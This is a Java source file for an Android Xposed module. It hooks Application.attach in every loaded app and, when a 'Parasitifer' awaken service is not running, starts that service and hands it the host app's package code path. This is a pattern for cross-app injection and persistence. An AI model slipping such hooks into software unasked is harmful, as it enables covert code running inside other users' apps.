package android.mf.application.xposed;

import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.mf.application.util.AppArguments;
import android.mf.application.util.SundryCodeManager;
import android.widget.Toast;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

public class MainXposed implements IXposedHookLoadPackage {

    private static String TAG = "MainXposed";
    private static Context initContext = null;

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        XposedHelpers.findAndHookMethod(Application.class,
                "attach",
                Context.class,
                new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        if (initContext == null) {
                            initContext = (Context) param.args[0];
                        } else if (!SundryCodeManager.isServiceRunning(initContext, AppArguments.PfAwakenService)) {
                            AwakenParasitifer(new Intent());
                        }
                    }
                });
    }

    private void AwakenParasitifer(Intent intentService) {
        ComponentName componentName = new ComponentName(AppArguments.PfPackage, AppArguments.PfAwakenService);
        intentService.setComponent(componentName);
        intentService.putExtra("Key", "Xposed");
        intentService.putExtra("Content", initContext.getPackageCodePath());
        initContext.startService(intentService);
    }
}
